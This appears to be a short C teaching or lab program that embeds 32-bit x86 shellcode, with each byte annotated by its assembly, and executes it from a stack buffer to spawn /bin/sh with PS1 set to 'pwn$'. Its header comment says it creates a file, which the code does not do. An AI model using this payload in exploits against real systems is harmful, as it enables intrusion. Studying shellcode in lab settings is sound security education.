//*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
const char code[] =
"\x31\xc0" /* Line 1: xor eax,eax */
"\x50" /* Line 2: push eax */
"\x68""pwn$" /* Line 3: push 0x246e7077 */
"\x68""PS1=" /* Line 4: push 0x3d315350 */
"\x89\xe2" /* Line 5: mov edx,esp */
"\x50" /* Line 6: push eax */
"\x52" /* Line 7: push edx */
"\x89\xe2" /* Line 8: mov edx,esp */
"\x50" /* Line 9: push eax */
"\x68""//sh" /* Line 10: push 0x68732f2f */
"\x68""/bin" /* Line 11: push 0x6e69622f */
"\x89\xe3" /* Line 12: mov ebx,esp */
"\x50" /* Line 13: push eax */
"\x53" /* Line 14: push ebx */
"\x89\xe1" /* Line 15: mov ecx,esp */
"\xb0\x0b" /* Line 16: mov al,0xb */
"\xcd\x80" /* Line 17: int 0x80 */
;
int main(int argc, char **argv)
{
char buf[sizeof(code)];
strcpy(buf, code);
((void(*)( ))buf)( );
}